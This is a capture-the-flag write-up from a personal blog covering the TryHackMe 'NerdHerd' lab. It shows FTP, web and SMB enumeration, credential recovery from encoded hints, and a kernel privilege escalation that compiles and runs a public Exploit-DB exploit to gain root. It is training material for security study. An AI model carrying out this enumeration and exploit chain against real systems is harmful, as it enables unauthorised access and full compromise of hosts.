---
layout: default
title : NerdHerd - Writeup
---

# [Main](https://bvr0n.github.io/) &nbsp;&nbsp;   [Contact](https://bvr0n.github.io/contact.html) &nbsp;&nbsp; [About Me](./aboutme.md) <br>

_**Nov 06, 2020**_

[NerdHerd](https://tryhackme.com/room/nerdherd) Writeup

## Nmap Scan :
```
bvr0n@kali:~$ nmap -sC -sV 10.10.203.70
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Sep 11 03:45 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.14.157
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0c:84:1b:36:b2:a2:e1:11:dd:6a:ef:42:7b:0d:bb:43 (RSA)
|   256 e2:5d:9e:e7:28:ea:d3:dd:d4:cc:20:86:a3:df:23:b8 (ECDSA)
|_  256 ec:be:23:7b:a9:4c:21:85:bc:a8:db:0e:7c:39:de:49 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: NERDHERD; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
1337/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: Host: NERDHERD; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -36m51s, deviation: 1h09m15s, median: 3m07s
|_nbstat: NetBIOS name: NERDHERD, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: nerdherd
|   NetBIOS computer name: NERDHERD\x00
|   Domain name: \x00
|   FQDN: nerdherd
|_  System time: 2020-11-06T20:27:25+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-06T18:27:26
|_  start_date: N/A
```

## FTP :

login to FTP we get a directory `/pub`, Enumerate it to get some juicy stuff :
```
bvr0n@kali:~/CTF/THM/NerdHerd_v2$ ncftp 10.10.203.70
ncftp /pub > ls -la
drwxr-xr-x    2 ftp      ftp          4096 Sep 14 18:35 .*****onyou
-rw-rw-r--    1 ftp      ftp         89894 Sep 11 03:45 youfoundme.png
ncftp /pub > cd .*****onyou   
ncftp /pub/.*****onyou > ls
hellon3rd.txt
```
After grabbing the image, i ran exiftoot on it and got this, This we'll use later :
```
Owner Name                      : fijbxslz
```

## Web Enum :

going to the web page and brute force directories we get a `/admin` that had something in the code source :

```
<!--
	these might help:
		Y2liYXJ0b3dza2k= : aGVoZWdvdTwdasddHlvdQ==
-->
```
When we decrypt it it gives :
```
Y2liYXJ0b3dza2k= : cibartowski
aGVoZWdvdTwdasddHlvdQ== : hehegou<.jÇ].[ÝD
```

## SMB :

```
bvr0n@kali:~/CTF/THM/NerdHerd_v2$ nbtscan 10.10.203.70

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
10.10.203.70     NERDHERD         <server>  NERDHERD         00:00:00:00:00:00
```

```
bvr0n@kali:~/CTF/THM/NerdHerd_v2$ smbclient --no-pass -L 10.10.203.70

Sharename       	        Type      Comment
---------       	        ----      -------
print$          	        Disk      Printer Drivers
********_********** 	    	Disk      Samba on Ubuntu
IPC$            	        IPC       IPC Service (nerdherd server (Samba, Ubuntu))
```
I tried accessing the `********_**********` but we need a valid user to login with, so i tried this :
```
bvr0n@kali:~/CTF/THM/NerdHerd_v2$ enum4linux 10.10.203.70
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov  6 14:06:12 2020

 ========================== 
|    Target Information    |
 ========================== 

Target ........... 10.10.203.70
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
============================= 
|    Users on 10.10.203.70    |
 ============================= 

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: *****    Name: ChuckBartowski    Desc: 

user:[chuck] rid:[0x3e8]
```

Looks like user `*****` have access to the shared folder, i tried accessing it with the creds i got earlier, but nothing!! so i asked the author!! this one `fijbxslz` was `Vigenere
Cipher` ! And the key to decrypt it is the youtube title we got earlier :
```
Key : ****istheword
Password : ****pass
```
```
bvr0n@kali:~/CTF/THM/NerdHerd_v2$ smbclient -U ***** //10.10.203.70/********_**********
Enter WORKGROUP\*****'s password: 
smb: \> dir
  secr3t.txt                          N      125  Thu Sep 10 21:29:53 2020
```
And we have access to the shared folder.

inside the file we get a directory and that leed us to ssh creds :))


## Internal Enum :

When i ran linpeas i noticed that this machine is running an outdated kernel :
```
chuck@nerdherd:~$ uname -a
Linux nerdherd 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```

I searched for it and i found this [Exploit](https://www.exploit-db.com/exploits/45010)

I downloaded the exploit into my machine and transferred it to the victims machine :

```
*****@nerdherd:~$ gcc 45010.c -o exploit
*****@nerdherd:~$ chmod +x exploit 
*****@nerdherd:~$ ./exploit 
root@nerdherd:~# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(chuck)
```

And we got ROOOOT :)))

For the root flag i did someting like this :
```
root@nerdherd:/root# find / -user root -type f -iname "*.txt"
```
Accourding to the room hint, the bonus flag is 100% located in `.bash_history`.


<br>
best regards

[bvr0n](https://linkedin.com/in/taha-el-ghadraoui-5921771a5)


<br>
[back to main()](../../index.md)

<br>
